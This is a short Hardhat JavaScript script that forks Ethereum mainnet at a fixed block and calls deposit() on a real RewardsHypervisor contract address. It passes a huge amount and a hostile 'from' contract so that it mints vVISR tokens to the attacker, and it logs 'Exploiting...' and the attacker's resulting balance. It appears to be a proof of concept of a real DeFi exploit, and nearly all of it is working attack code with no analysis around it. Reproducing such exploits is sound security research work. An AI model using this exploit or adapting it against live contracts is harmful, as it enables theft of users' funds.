const hre = require("hardhat");

async function main() {
    hre.network.config.forking.blockNumber=13841698;

    const Attacker = await hre.ethers.getSigner();

    const RewardsHypervisor = await hre.ethers.getContractAt('IRewardsHypervisor', "0xc9f27a50f82571c1c8423a42970613b8dbda14ef")
    const depositTx = await RewardsHypervisor.deposit("1190000000000000000000","0x7D2eCc357cc50A0c2c59A2D1d1587Ea27e096A05",Attacker.getAddress());
    console.log("Exploiting... transcation:", depositTx.hash);
    await depositTx.wait();
    console.log("exploit complete");

    const vVISR = await hre.ethers.getContractAt("IvVISR","0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5");
    const balance = (await vVISR.balanceOf(Attacker.address))/(10**(await vVISR.decimals()))
    console.log("Attacker vVISR balance:"+balance);



}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
